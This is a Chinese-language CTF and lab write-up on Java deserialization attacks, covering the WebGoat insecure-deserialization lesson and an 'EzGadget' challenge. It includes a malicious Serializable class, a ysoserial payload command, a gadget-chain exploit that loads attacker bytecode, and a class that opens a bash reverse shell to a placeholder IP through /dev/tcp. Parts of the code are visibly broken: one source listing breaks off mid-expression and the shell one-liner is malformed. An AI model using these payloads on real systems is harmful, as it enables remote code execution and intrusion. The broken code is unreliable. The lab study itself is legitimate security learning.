### webgoat中的反序列化
挑战：以下输入框接收序列化对象（字符串）并对其进行反序列化。
    rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l
尝试更改此序列化对象，以便将页面响应延迟 5 秒。
> JAVAWEB特征可以作为序列化的标志参考:  
>  一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据。  
>  或者如果以aced开头，那么他就是这一段java序列化的16进制。
反编译得到源码，查看`BOOT-INF/lib/insecure-deserialization-8.2.2.jar`，编码是base64  
找它的切入点，也就是反序列化的位置  
然后追踪到`VulnerableTaskHolder.java`的代码中，但是在jd-gui中无法访问，所以就直接去GitHub中找源码，发现了这里，只允许使用ping和sleep函数来让系统进行延时。  
自定义一个恶意类，其中写入反弹shell的命令或者按照靶场的指示进行延时5s。
    //evil.java
    class evil implements Serializable {
        // readObject()
        private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
小tips：进行payload生成时，需要先反编译源码，把源码找出来，不管是CTF还是此靶场。  
然后生成payload的自建恶意类也需要在这里面创建。不然反序列化出的payload不可用。
    package org.dummy.insecure.framework;
    import java.io.BufferedReader;
    import java.io.IOException;
    import java.io.InputStreamReader;
    import java.io.ObjectInputStream;
    import java.io.Serializable;
    import java.time.LocalDateTime;
    public class VulnerableTaskHolder implements Serializable {
        private static final long serialVersionUID = 2;
        private String taskName;
        private String taskAction;
        private LocalDateTime requestedExecutionTime;
        public VulnerableTaskHolder(String taskName, String taskAction) {
            super();
            this.taskName = taskName;
            this.taskAction = taskAction;
            this.requestedExecutionTime = LocalDateTime.now();
        }
        @Override
        public String toString() {
            return "org.dummy.insecure.framework.VulnerableTaskHolder [taskName=" + taskName + ", taskAction=" + taskAction + ", requestedExecutionTime="
                    + requestedExecutionTime + "]";
        }
        /**
         * Execute a task when de-serializing a saved or received object.
         * @author stupid develop
         */
        private void readObject( ObjectInputStream stream ) throws Exception {
            //unserialize data so taskName and taskAction are available
            stream.defaultReadObject();
            //do something with the data
            System.out.println("restoring task: "+taskName);
            System.out.println("restoring time: "+requestedExecutionTime);
            if (requestedExecutionTime!=null &&
                    (requestedExecutionTime.isBefore(LocalDateTime.now().minusMinutes(10))
                            || requestedExecutionTime.isAfter(LocalDateTime.now()))) {
                //do nothing is the time is not within 10 minutes after the object has been created
                System.out.println(this.toString());
                throw new IllegalArgumentException("outdated");
            }
            //condition is here to prevent you from destroying the goat altogether
            if ((taskAction.startsWith("sleep")||taskAction.startsWith("ping"))
                    && taskAction.length()  注意编译时的Java版本问题，这个目前不是很清楚。
运行得出payload。  
还可以直接拿shell，利用bash反弹shell  
生成payload使用工具`ysoserial.jar`，这里使用修改版的。
    java -jar ysoserial.jar
利用选1，寻找可用payload选2
    java -Dhibernate5 -cp hibernate-core-5.4.28.Final.jar;ysoserial.jar ysoserial.GeneratePayload Hibernate1 "calc.exe" > m0re.bin
生成的bin文件，进行base64编码。
    #!/usr/bin/python3
    # -*- coding:utf-8 -*-    import base64
    file = open("m0re.bin","rb")
    access = file.read()
    payload = base64.b64encode(access)
    print(payload)
    file.close()
版本可能不匹配。  
也有运行`mvn clean package
-DskipTests`重新编译`ysoserial.jar`的。可以参考这个[地址](https://www.jianshu.com/p/b309a4573abd)  
还没有了解，先mark了。后续再看。这个关卡就先pass了。还有题目看呢，编译问题就不涉及太多内容了。
### EzGadget
因为比赛的时候不会写，Java反序列化一脸懵，所以才来钻研了Java反序列化的基础和简单利用。  
直接反编译，审计
    public String unser(@RequestParam(name="data", required=true) String data, Model model) throws Exception { byte[] b = Tools.base64Decode(data);
        InputStream inputStream = new ByteArrayInputStream(b);
        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
        String name = objectInputStream.readUTF();
        int year = objectInputStream.readInt();
        if ((name.equals("gadgets")) && (year == 2021)) {
            objectInputStream.readObject();
        }
这是反序列化的点。  
其中反序列化前还需要加个验证。
    oos.writeUTF("gadgets");
    oos.writeInt(2021);
`toString()`函数加载字节码，cc链还没有看，准备下次学习一下java自带的一些类，然后再进行深入了解cc链。
引用大佬的exp
    import com.ezgame.ctf.tools.ToStringBean;
    import ezgame.ctf.bean.User;
    import javax.management.BadAttributeValueExpException;
    import java.io.IOException;
    import java.io.InputStream;
    import java.lang.reflect.Field;
    public class exp {
        public static void main(String[] args) throws Exception {
            InputStream inputStream = evil.class.getResourceAsStream("evil.class");
            byte[] bytes = new byte[inputStream.available()];
            inputStream.read(bytes);
            ToStringBean sie =new ToStringBean();
            Field bytecodes = Reflections.getField(sie.getClass(),"ClassByte");
            Reflections.setAccessible(bytecodes);
            Reflections.setFieldValue(sie,"ClassByte",bytes);
            BadAttributeValueExpException exception = new BadAttributeValueExpException("exp");
            Reflections.setFieldValue(exception,"val",sie);
                    String a=Serialize.serialize(exception);
            System.out.print(a);
        }
    }
加载的话，可以使用反弹shell的。
    //evil.jaba
    package com.ezgame.ctf.exp;
    import java.io.IOException;
    public class evil {
        static {
            try{
            Runtime r = Runtime.getRuntime();
            String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/xxx.xxx.xx.xxx/1234;cat &5 >&5; done"};
            Process p = r.exec(cmd);
            p.waitFor();
            }catch (IOException e){
                }
            }
        }
    }
## 总结
感觉Java的知识不是很好掌握，可能是我太菜了，玩不动Java，没有常用Java，所以理解起来有点难，知识点还是一点一点啃吧。
## 参考链接